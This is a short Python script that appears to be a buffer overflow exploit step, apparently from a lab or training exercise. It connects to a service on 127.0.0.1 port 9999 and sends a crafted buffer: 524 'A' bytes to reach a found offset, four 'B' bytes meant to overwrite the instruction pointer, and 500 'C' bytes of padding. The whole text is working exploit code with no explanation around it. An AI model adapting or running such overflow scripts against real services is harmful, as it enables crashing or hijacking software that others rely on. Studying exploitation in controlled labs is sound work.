import socket, time, sys
offset = 524
buffer= "A"*offset +"B"*4 + "C"*500
print(buffer)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(('127.0.0.1',9999))
s.recv(1024)
print(len(buffer)," bytes sent!" )
s.send(buffer)
data = s.recv(1024)
s.close()

